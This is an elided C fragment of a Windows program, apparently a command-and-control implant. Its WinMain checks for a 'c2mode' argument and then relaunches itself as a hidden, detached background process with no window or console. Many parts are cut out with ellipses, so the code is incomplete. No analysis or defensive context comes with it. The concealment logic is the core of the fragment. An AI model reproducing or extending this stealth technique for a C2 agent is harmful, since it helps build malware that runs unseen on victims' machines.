...
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ...
    if (lpCmdLine && strstr(lpCmdLine, "c2mode") != NULL) {
        // DON'T allocate console - run silently
    ...
    // 1. Start ourselves again in C2 mode (hidden background process)
    STARTUPINFO si_c2 = {sizeof(si_c2)};
    PROCESS_INFORMATION pi_c2;
    si_c2.dwFlags = STARTF_USESHOWWINDOW;
    si_c2.wShowWindow = SW_HIDE;  // Hidden window
    ...
    if (CreateProcess(
        ...
        cmdLine,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,  // No window, detached
        NULL, NULL,
        &si_c2, &pi_c2
    )) {
